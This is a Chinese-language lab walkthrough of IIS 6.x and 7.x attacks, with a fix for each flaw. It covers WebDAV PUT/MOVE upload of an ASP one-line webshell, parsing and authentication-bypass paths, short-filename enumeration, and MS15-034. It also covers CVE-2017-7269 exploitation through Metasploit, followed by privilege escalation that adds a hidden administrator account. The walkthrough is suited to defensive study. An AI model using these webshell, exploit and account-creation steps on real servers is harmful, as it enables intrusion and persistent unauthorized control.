## 简介

IIS（inernet information services）互联网信息服务是 Microsoft 公司提供的可扩展 web 服务器，支持
HTTP、HTTP/2、HTTPS、FTP、FTPS、SMTP 和 NNTP 等。起初用于windows NT系列，随后内置在windows
2000、windows XP 和后续版本一起发行。IIS目前只支持 windows 系统，不适用于其它操作系统

## IIS 6.x 渗透总结

### IIS 6.x 安装

IIS6.x安装需要 Windows Server 2003的系统

![1](https://image.3001.net/images/20211115/1636944425_6191ca29e740eb6349b37.png!small)

![2](https://image.3001.net/images/20211115/1636944427_6191ca2b42d55ae870a91.png!small)

IIS 6.0安装需要插件，自行百度下载

![3](https://image.3001.net/images/20211115/1636944429_6191ca2d07fd0dc8eec12.png!small)

然后下一步即可安装完成

![4](https://image.3001.net/images/20211115/1636944431_6191ca2f654eddc4564fc.png!small)

![5](https://image.3001.net/images/20211115/1636944433_6191ca312e56002118c2c.png!small)

![6](https://image.3001.net/images/20211115/1636944434_6191ca3237f84dc15ace4.png!small)

![7](https://image.3001.net/images/20211115/1636944434_6191ca32e6624cfaf5693.png!small)

创建网站，并用物理机访问

### 以下为 IIS 6.x 攻防详解

### IIS写权限漏洞

开启webDAV引起的IIS写权限漏洞（攻击者可以上传文件）

PUT任意上传漏洞

![8](https://image.3001.net/images/20211115/1636944435_6191ca33ba1cc0078a132.png!small)

改为允许，并开启脚本资源访问和写入

![9](https://image.3001.net/images/20211115/1636944436_6191ca34983e9c35b5e62.png!small)

使用工具已经可以检测出漏洞

![10](https://image.3001.net/images/20211115/1636944437_6191ca3577f60123ce01a.png!small)

修改来宾用户权限

![11](https://image.3001.net/images/20211115/1636944438_6191ca3662164eaa23730.png!small)

此时创建一个文本文档，输入一句话木马

    
    
    <%eval request("123")%>

使用工具put方式进行上传

![12](https://image.3001.net/images/20211115/1636944439_6191ca3758d3b93fc2e32.png!small)

可以看到这里成功通过 PUT 的方法上传了一个含有 asp
一句话的txt文件。之所以不直接上传一个asp一句话木马是因为通常情况下上传txt文本不会出错，但是上传asp就会报错

![13](https://image.3001.net/images/20211115/1636944440_6191ca386112ad2c3f7ec.png!small)

为了获取shell，这里可以用MOVE方法将刚刚上传的txt文件修改为asp文件，从而将文本文件变成可执行的脚本文件。MOVE协议不会更改文件内容

开启IIS的asp解析功能

![14](https://image.3001.net/images/20211115/1636944441_6191ca39bce64fbce514d.png!small)

使用蚁剑尝试连接

![15](https://image.3001.net/images/20211115/1636944442_6191ca3abfa1d45332873.png!small)

修复建议：

IIS PUT 漏洞完全是因为管理员的一些不当配置导致的，所以修复只需要以下两点：

  1. 关闭WebDAV

  2. 关闭写入权限

### 文件解析漏洞

IIS文件解析漏洞：*.asp;.xxx像这样畸形（IIS 10.0 8.5 都可能存在，属于PHP版本解析漏洞）的文件

IIS只会把他当作xxx.asp文件执行不会看分号之后的内容

IIS目录解析漏洞：以 *.asp 命名的文件夹中的文件都会被当作 asp 文件执行

IIS文件解析漏洞

首先创建一个 Ylion.asp 文件

    
    
    <%=time()%>

![16](https://image.3001.net/images/20211115/1636944444_6191ca3c06a856a61019c.png!small)

复制该文件进行重命名并访问

![17](https://image.3001.net/images/20211115/1636944445_6191ca3d209d9888500dd.png!small)

![18](https://image.3001.net/images/20211115/1636944445_6191ca3dd461586724fc7.png!small)

### IIS 目录解析漏洞

该版本默认会将 *.asp/ 目录下的所有文件当成 Asp 解析

新建两个空的文件夹

![19](https://image.3001.net/images/20211115/1636944446_6191ca3ec17c60fe5603e.png!small)

分别复制 1.jpg 1.zip 放入，内容和上面的asp文件内容一致，分别进行访问

![20](https://image.3001.net/images/20211115/1636944447_6191ca3f93fccf3fa0c39.png!small)

![21](https://image.3001.net/images/20211115/1636944448_6191ca4063723b9758627.png!small)

访问文件夹1下的，依旧是一张图片

访问文件夹1.asp下的，成功被解析

这就是IIS的文件解析漏洞

另外，IIS6.x除了会将扩展名为 .asp 的文件解析为asp之外，默认会将扩展名为 .asa、.cdx、.cer解析为 asp，从网站属性，主目录，配置
可以看出，他们都是调用了 asp.dll 进行的解析：

![22](https://image.3001.net/images/20211115/1636944449_6191ca4154ce27338f3ec.png!small)

修复建议：

微软认为这个并不算是一个漏洞，也没有推出 IIS6.0 的补丁，因此漏洞需要自己修复

  1. 设置权限无

![23](https://image.3001.net/images/20211115/1636944450_6191ca42b3f8f8a7a300c.png!small)

  2. 不允许新建目录

  3. 上传的文件需要经过重命名（时间戳+随机数+ .jpg 等）

### IIS 短文件漏洞

攻击者可以利用 " ~ " 字符猜解或遍历服务器中的文件名，或对IIS服务器中的 .Net Framework 进行 拒绝服务攻击

就是存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件

  1. 简介

Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于MS-DOS或16位windows的程序访问这些文件。在cmd下输入
"dir /x" 即可看到短文件名效果

![24](https://image.3001.net/images/20211115/1636944452_6191ca443c7b5d8d27ecf.png!small)

IIS短文件名产生：

当后缀小于4时，短文件名产生需要文件（夹）名前缀字符长度大于等于9位

当后缀大于等于4时，文件名前缀字符长度即使位1，也会产生短文件名

目前 IIS 支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。

IIS 8.0 之后的版本只能通过OPTIONS和TRACE方法被猜测成功

  2. 复现

IIS8.0 以下版本需要开启ASP.NET支持，IIS大于等于8.0版本，即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功

实操一下：

还是找到添加与删除程序，点击添加程序

![25](https://image.3001.net/images/20211115/1636944453_6191ca45073324627da41.png!small)

找到ASP.NET，点击下一步并安装

在web服务扩展里面，右键刷新

![26](https://image.3001.net/images/20211115/1636944453_6191ca45cee61acb124d1.png!small)

随便创建个后缀长度为4的文件：

![27](https://image.3001.net/images/20211115/1636944454_6191ca46bf58216604c5f.png!small)

远程访问一下：

![28](https://image.3001.net/images/20211115/1636944455_6191ca47be45a0f872506.png!small)

远程访问返回404

访问构造某个不存在的短文件名时，会返回400：

![29](https://image.3001.net/images/20211115/1636944456_6191ca48c07669a2c6b59.png!small)

EXP：（利用工具）

<https://github.com/WebBreacher/tilde_enum>

<https://github.com/irsdl/IIS-ShortName-Scanner>

工具使用：

安装JAVA7

点击run.bat 输入地址：

![30](https://image.3001.net/images/20211115/1636944457_6191ca49d474df1b54b12.png!small)

输入对应IP，选择no

![31](https://image.3001.net/images/20211115/1636944459_6191ca4ba900f2313ea9c.png!small)

然后一路回车，就爆破出来了

![32](https://image.3001.net/images/20211115/1636944461_6191ca4d9bdc23943a766.png!small)

修复建议：

  1. 从CMD命令关闭NTFS 8.3 文件格式的支持

windows server 2003：（1代表关闭，0代表开启）

关闭该功能：

fsutil behavior set disable8dot3 1

windows server 2008 R2:

查询是否开启短文件名功能：fsutil 8dot3name query

关闭该功能：fsutil 8dot3name set 1

不同系统关闭命令稍有区别，该功能是默认开启的

  2. 或从修改注册表关闭NTFS 8.3文件格式的支持

快捷键Win+R打开命令窗口，输入regedit打开注册表窗口

找到路径：

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem

![33](https://image.3001.net/images/20211115/1636944462_6191ca4ebbe3e836403b0.png!small)

将其中选中的那一项的值设为1，1代表不创建短文件名格式

注意：

以上两种方式修改完成后，均需要重启系统生效。

此方法只能禁止NTFS8.3格式文件名创建，已经存在的文件的短文件名无法移除，需要重新复制才会消失

IIS短文件漏洞局限性：

  1. 如果文件名本身太短也是无法猜解的；

  2. 此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；

  3. 如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；

  4. 如果文件名前6位带点 "." ，扫描程序会认为是文件而不是文件夹，最终出现误报；

  5. 不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测

实战用处：

猜后台

猜敏感文件，例如备份的rar、zip、.bak、.SQL文件等

在某种情形下，甚至可以通过短文件名直接下载对应的文件。比如下载备份SQL文件

### RCE-CVE-2017-7269

  1. 简介

Mcrosoft Windows Server 2003 R2中的Internet信息服务（IIS）6.0中的 WebDAV 服务中的
ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 "If : <http://" 开头的长标执行任意代码 PROPFIND
请求

影响范围：

Windows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。

  2. 复现

EXP：

<https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py>

对ip及对应端口进行修改：

![34](https://image.3001.net/images/20211115/1636944464_6191ca50708d723211028.png!small)

任务管理器开启了 calc.exe 进程，因为计算机是网络服务权限打开的，所以我们在桌面上看不见

需要python2环境

漏洞修复：

关闭 WebDAV 服务

使用相关防护设备

### 远程代码执行实战运用

前提条件：

IIS 6.0 开启 WebDAV

![35](https://image.3001.net/images/20211115/1636944466_6191ca5286d96de2812ff.png!small)

确保开启WebDAV

exp下载地址：

<https://github.com/zcgonvh/cve-2017-7269>

下载后放入msf中，路径为 /url/share/metasploit-framework/modules/exploits/windows/iis/

注意文件名中-修改为_，否则无法识别，然后拿到了shell（失败后靶机恢复快照，否则可能之后的攻击无效）

放入后直接执行：

![36](https://image.3001.net/images/20211115/1636944468_6191ca54269ff47ae6302.png!small)

use exploit/windows/iis/cve_2017-7269

set rhosts 192.168.27.182

![37](https://image.3001.net/images/20211115/1636944470_6191ca56c846dd6a9e86e.png!small)

失败了，检查原因：

![38](https://image.3001.net/images/20211115/1636944473_6191ca590adfa7d9bdfdd.png!small)

默认网站->属性，在IP地址中未分配，可以解释为非默认绑定。该EXP只适用于默认绑定和默认路径的情况才可以提权

![39](https://image.3001.net/images/20211115/1636944475_6191ca5b18381f44cf3be.png!small)

设置完重启系统

批量检测工具：

<https://github.com/admintony/Windows-Exploit/tree/master/IIS6_WebDAV_Scanner>

python IIS6_WebDAV_Scanner.py -p 12.txt

python2环境执行，检测出长度为19

然后在msf上设置PhysicalPathLength为19

set PhysicalPathLength 19

![40](https://image.3001.net/images/20211115/1636944477_6191ca5d95bcae2c27fe1.png!small)

成功拿到低权用户，然后使用pr提权，利用msf上传pr.exe

upload '/root/Desktop/pr.exe' c:\Windows\system32\inetsrv

然后进行创建用户

pr.exe "net user a002 963852 /add"

添加到管理员组

pr.exe "net localgroup administrators a002 /add

## IIS 7.x 渗透总结

### IIS 7.x 安装

以安装IIS 7.5 为例：

![41](https://image.3001.net/images/20211115/1636944480_6191ca601a0f47e790e5f.png!small)

首先找到打开或关闭Windows功能界面

然后选择下列功能点

![42](https://image.3001.net/images/20211115/1636944481_6191ca61f16bab869bf74.png!small)

点击确定

![43](https://image.3001.net/images/20211115/1636944484_6191ca641cbf9b464f6ef.png!small)

![44](https://image.3001.net/images/20211115/1636944486_6191ca666c2c546c5a3d7.png!small)

![45](https://image.3001.net/images/20211115/1636944488_6191ca687fea9002a9965.png!small)

![46](https://image.3001.net/images/20211115/1636944489_6191ca69c202178759ac2.png!small)

### 以下为 IIS 7.x 攻防详解

### 解析漏洞

![47](https://image.3001.net/images/20211115/1636944491_6191ca6b2a22bea23e7b6.png!small)

![48](https://image.3001.net/images/20211115/1636944492_6191ca6c73a9dcb676707.png!small)

新建png文件，其中写有php语句，直接访问，发现不可以

![49](https://image.3001.net/images/20211115/1636944493_6191ca6de18b3f3301dbb.png!small)

![50](https://image.3001.net/images/20211115/1636944495_6191ca6fad4a09895e034.png!small)

点击确定，访问路径后面加上 /.php 尝试

![51](https://image.3001.net/images/20211115/1636944497_6191ca71504e27b929523.png!small)

成功解析为php文件

IIS 7.x 版本在 Fast-CGI 运行模式下，在任意文件，例：Ylion.png 加上 /.php ，会将 Ylion.png.php
解析为php文件

WebDAV在IIS7.5的这里

![53](https://image.3001.net/images/20211115/1636944498_6191ca72e207be24f8fad.png!small)

修复建议：配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序

![52](https://image.3001.net/images/20211115/1636944501_6191ca752dc85758d597c.png!small)

### HTTP.SYS远程代码执行（MS15-034）

IIS的安全脆弱性曾长时间被业内诟病，一旦IIS出现远程执行漏洞威胁将会非常严重。远程代码漏洞威胁将会非常严重。远程执行代码漏洞存在于HTTP协议堆栈中，当HTTP.sys未正确分析经特殊设计的HTTP请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统账户的上下文中执行任意代码，可以导致IIS服务器所在机器蓝屏或读取其内存中的机密数据。

影响范围：

Windows7、Windows server 2008 R2、Windows8、Windows server2012、Windows8.1和Windows
server 2012 R2

漏洞影响版本：

IIS 7.5、IIS 8.0、IIS 8.5

复现：

在Windows7 上安装 IIS 7.5

访问 IIS 7.5

编辑请求头： Range: bytes=0-18446744073709551615

增加字段，若返回码状态为416 Requested Range Not Satisfiable，则存在 HTTP.SYS远程代码执行漏洞

![54](https://image.3001.net/images/20211115/1636944503_6191ca776234d90878fc3.png!small)

修复建议：

安装修复补丁(KB3042553)

### 认证绕过漏洞

简介：

Microsof IIS是 Microsoft windows系统默认自带的Web服务器软件，其中默认包含FTP服务。Microsof
IIS中存在认证绕过漏洞和源码泄露漏洞，该漏洞源于对用户提供的输入未经正确的验证。攻击者可利用这些漏洞在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问，且有助于进一步攻击。

漏洞影响版本：

IIS6.0、IIS7.5

漏洞原因：

Microsof IIS由于无法正确清理用户提供的输入，容易岀现身份验证绕过漏洞和源代码泄露漏洞。

主要包括以下三类绕过

  1. 安装了PHP的Microsof IIS6.0身份验证绕过

IIS/6.0加载受保护（如：admin）目录中的PHP文件需要用户认证信息（用户名和密码访问），如果将“∷$INDEX_ALLOCATION”后缀附加到目录名称后面，存在绕过认证并可能访问管理文件等特殊情况，导致IIS服务器重要信息泄露:

/admin::$INDEX_ALLOCATION/index.php

  2. Microsof IIS7.5经典ASP身份验证绕过

配置了经典ASP和 .NET Framework 4.0的Microsof IIS7.5，通过将:i30:I
NDEX_ALLOCATION后缀附加到需要认证的请求目录名称后面，可以绕过经典的ASP文件访问限制

/admin:$i30:$INDEX_ALLOCATION/index.asp

  3. Microsof IIS7.5 .NET源代码公开和身份验证绕过

在配置中安装了PHP的Microsof IIS7.5，存在认证绕过漏洞；

[http://%3CvictimIIS75%3E/admin](/admin):$i30:$INDEX_ALLOCATION/admin.php

漏洞复现：

在window7下，默认IIS7.5

IIS网站根目录下创建admin用户目录，关闭默认用户认证，换言之，访问 /admin/index.php
目录下的文件需要认证信息，认证失败或者无认证信息将会返回401未授权页面

![55](https://image.3001.net/images/20211115/1636944505_6191ca79437c11a5da6bd.png!small)

![56](https://image.3001.net/images/20211115/1636944507_6191ca7b802b93b637833.png!small)

重启IIS服务器，远程访问此文件，提示401未授权

![57](https://image.3001.net/images/20211115/1636944509_6191ca7d5223bdef2e6d9.png!small)

利用

    
    
    /admin:$i30:$INDEX_ALLOCATION/index.asp 

来绕过此限制，浏览器访问：

    
    
    http://192.168.253.72:8980/admin:$i30:$INDEX_ALLOCATION/index.php

![58](https://image.3001.net/images/20211115/1636944511_6191ca7f4478baeb03ae9.png!small)

可以成功绕过并访问到敏感信息

### 解析漏洞+认证绕过漏洞

目标站点限制上传和访问php文件

可以利用上传aspx（.net支持解析的文件类型）文件逃避限制，将其当做php代码执行

网站目录下有一个 index.aspx的文件，里面写有php代码

![59](https://image.3001.net/images/20211115/1636944513_6191ca81dbcb801980070.png!small)

认证漏洞绕过访问 index.aspx文件，页面返回乱码，未执行 phpinfo代码！

    
    
    http://IP/a001:$i30:$INDEX_ALLOCATION/index.aspx

![60](https://image.3001.net/images/20211115/1636944515_6191ca83dab357f17d42c.png!small)

这里我们再加上解析漏洞

    
    
    http://IP/a001:$i30:$INDEX_ALLOCATION/index.aspx/.php

![61](https://image.3001.net/images/20211115/1636944517_6191ca8556ef2167af1c3.png!small)

成功执行

利用方法：

安装php的IIS6.0，例：访问目标/admin/index.php 显示401，访问

    
    
    /admin:$i30:$INDEX_ALLOCATION/index.php 

即可

IIS 7.5 ：同上

可以绕过并访问到敏感信息

防护思路：

IIS7.5 配置 .NET Framework 2.0 不受上述第二条绕过影响

攻击者需要事先获取IIS服务器受认证保护目录

